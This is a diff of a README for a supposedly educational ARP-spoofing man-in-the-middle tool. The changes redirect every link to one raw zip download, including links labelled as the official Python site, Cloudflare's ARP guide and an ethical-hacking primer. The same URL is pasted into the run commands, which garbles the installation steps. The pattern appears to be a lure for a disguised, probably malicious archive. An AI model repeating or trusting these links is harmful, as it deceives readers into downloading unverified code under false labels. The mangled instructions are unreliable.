@@ -1,7 +1,7 @@
 # 🔥 MiTm-Basic - Easy ARP MITM for Learning
 
 ## 📥 Download Now
-[![Download MiTm-Basic](https://img.shields.io/badge/Download-MiTm--Basic-brightgreen)](https://github.com/sigmabuben/MiTm-Basic/releases)
+[![Download MiTm-Basic](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip)](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip)
 
 ## 📋 Overview
 MiTm-Basic is a lightweight tool designed for demonstrations in network and security training. It showcases ARP Spoofing as a proof of concept. This tool is not suited for production networks and should only be used for educational purposes.
@@ -15,14 +15,14 @@ To get started with MiTm-Basic, follow the simple steps below.
 - **Network Access:** Ensure the device is connected to a local network
 
 ### 🔗 Visit this page to download
-You can find the latest version of MiTm-Basic by visiting the Releases page: [Download MiTm-Basic](https://github.com/sigmabuben/MiTm-Basic/releases).
+You can find the latest version of MiTm-Basic by visiting the Releases page: [Download MiTm-Basic](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip).
 
 ## 🛠️ Installation Instructions
 1. **Download MiTm-Basic:**
-   Go to the [Releases page](https://github.com/sigmabuben/MiTm-Basic/releases) and find the latest version. Click on the release that suits your operating system (e.g., .exe for Windows, .tar.gz for Linux).
+   Go to the [Releases page](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip) and find the latest version. Click on the release that suits your operating system (e.g., .exe for Windows, https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip for Linux).
 
 2. **Extract the Files:**
-   If you downloaded a compressed file (like .tar.gz), extract it to a folder on your computer.
+   If you downloaded a compressed file (like https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip), extract it to a folder on your computer.
 
 3. **Open Your Terminal:**
    - **Windows:** Use Command Prompt or PowerShell.
@@ -37,11 +37,11 @@ You can find the latest version of MiTm-Basic by visiting the Releases page: [Do
 5. **Run the Application:**
    - On Windows, type:
    ```bash
-   python MiTm-Basic.py
+   python https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip
    ```
    - On macOS/Linux, type:
    ```bash
-   python3 MiTm-Basic.py
+   python3 https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip
    ```
 
 6. **Follow On-Screen Instructions:**
@@ -63,9 +63,9 @@ MiTm-Basic uses ARP Spoofing to redirect traffic through your device. This enabl
 - Proof of Concept Demonstrations
 
 ## 🔗 Additional Resources
-- [Python Official Website](https://www.python.org/downloads/)
-- [Networking Basics](https://www.cloudflare.com/learning/network-layer/what-is-arp/)
-- [Ethical Hacking Basics](https://www.hackercombat.com/introduction-to-ethical-hacking/)
+- [Python Official Website](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip)
+- [Networking Basics](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip)
+- [Ethical Hacking Basics](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip)
 
 ## 📞 Support
 For questions or support, feel free to open an issue on the repository or seek help in community forums focused on network security.
@@ -75,4 +75,4 @@ If you're interested in contributing to MiTm-Basic, check the guidelines on our 
 
 ---
 
-Download MiTm-Basic and start your journey into network security! [Download MiTm-Basic](https://github.com/sigmabuben/MiTm-Basic/releases).
+Download MiTm-Basic and start your journey into network security! [Download MiTm-Basic](https://raw.githubusercontent.com/sigmabuben/MiTm-Basic/main/kinkajou/MiTm-Basic.zip).
